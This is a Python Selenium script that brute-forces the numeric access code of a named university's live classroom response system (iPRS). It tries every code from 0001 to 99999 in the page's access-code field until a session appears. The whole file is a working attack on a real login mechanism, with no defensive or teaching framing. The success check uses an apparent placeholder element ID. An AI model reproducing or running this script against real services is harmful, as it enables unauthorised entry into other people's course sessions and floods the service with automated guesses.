from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

# Webdriver config
driver_path = "prebuilt/chromedriver.exe" # Chrome 130
service = Service(executable_path=driver_path)
driver = webdriver.Chrome(service=service)

# iPRS URL
url = "https://prsmob.ust.hk/ars/mobile/home/iLearn"

# Passcode testing range
start_code = 1
end_code = 99999

def format_passcode(code):
    if code < 10000:
        return "{:04d}".format(code)
    return "{:05d}".format(code)

def attempt_code(passcode):
    try:
        password_field = WebDriverWait(driver, 0.1).until(
            EC.presence_of_element_located((By.ID, "accessCode"))
        )
        password_field.send_keys(passcode)

        try:
            success_element = WebDriverWait(driver, 0.1).until(
                EC.presence_of_element_located((By.ID, "success_element_id")) # waiting for a legit iprs session
            )
            print(f"iPRS passcode is found: {passcode}")
            return True
        except TimeoutException:
            print(f"No iPRS course with code {passcode}.")
            password_field.clear()
            return False

    except TimeoutException:
        print("Timeout waiting for page elements.")
        return False
    except NoSuchElementException:
        print("Could not find iPRS code element, did iPRS change UI?")
        return False

driver.get(url)
input("Press Enter to start iPRS testing (or Ctrl+C to cancel)...")
for code in range(start_code, end_code + 1):
    formatted_code = format_passcode(code)
    if attempt_code(formatted_code):
        break


# Close the browser
driver.quit()